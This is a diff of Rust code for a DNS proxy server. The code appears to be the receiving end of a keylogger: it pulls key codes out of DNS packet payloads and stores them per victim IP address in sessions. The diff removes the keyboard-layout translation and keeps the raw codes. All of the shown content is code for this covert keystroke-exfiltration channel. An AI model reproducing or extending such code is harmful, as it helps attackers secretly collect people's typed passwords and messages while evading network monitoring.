@@ -1,4 +1,3 @@
-pub mod utils;
 use std::{
     collections::{hash_map::Entry, HashMap},
     net::{Ipv4Addr, SocketAddr},
@@ -9,7 +8,6 @@ use anyhow::Error;
 use log::{debug, error, info};
 use tamanoir_common::ContinuationByte;
 use tokio::{net::UdpSocket, sync::Mutex};
-use utils::{init_keymaps, KEYMAPS};
 
 use crate::{
     Layout, Session, SessionsStore, AR_COUNT_OFFSET, AR_HEADER_LEN, FOOTER_LEN, FOOTER_TXT,
@@ -42,11 +40,11 @@ pub async fn mangle(
     data[2] = 1;
     data[3] = 32;
 
-    let key_map = KEYMAPS
-        .get()
-        .ok_or(Error::msg("error geting LAYOUT KEYMAPS"))?
-        .get(&(layout as u8))
-        .ok_or(Error::msg("unknow layout"))?;
+    // let key_map = KEYMAPS
+    //     .get()
+    //     .ok_or(Error::msg("error geting LAYOUT KEYMAPS"))?
+    //     .get(&(layout as u8))
+    //     .ok_or(Error::msg("unknow layout"))?;
 
     let session = Session::new(addr).unwrap();
     if let std::collections::hash_map::Entry::Vacant(e) = current_sessions.entry(session.ip) {
@@ -57,16 +55,18 @@ pub async fn mangle(
     let current_session = current_sessions.get_mut(&session.ip).unwrap();
 
     for k in payload {
-        if k != 0 {
-            let last_key_code = current_session.key_codes.last();
-            if key_map.is_modifier(last_key_code) {
-                let _ = current_session.keys.pop();
-            }
-            let mapped_keys = key_map.get(&k, last_key_code);
-            current_session.key_codes.push(k);
-            current_session.keys.extend(mapped_keys)
-        }
+        current_session.key_codes.push(k)
     }
+    // if k != 0 {
+    //     let last_key_code = current_session.key_codes.last();
+    //     if key_map.is_modifier(last_key_code) {
+    //         let _ = current_session.keys.pop();
+    //     }
+    //     let mapped_keys = key_map.get(&k, last_key_code);
+    //     current_session.key_codes.push(k);
+    //     current_session.keys.extend(mapped_keys)
+    // }
+    //}
     // if !log_enabled!(Level::Debug) {
     //     print!("\x1B[2J\x1B[1;1H");
 
@@ -143,7 +143,6 @@ impl DnsProxy {
     pub async fn serve(&self, sessions_store: SessionsStore) -> anyhow::Result<()> {
         {
             info!("Starting dns proxy server");
-            init_keymaps();
             let sock = UdpSocket::bind(format!("0.0.0.0:{}", self.port)).await?;
             debug!(
                 "DNS proxy is listening on {}",
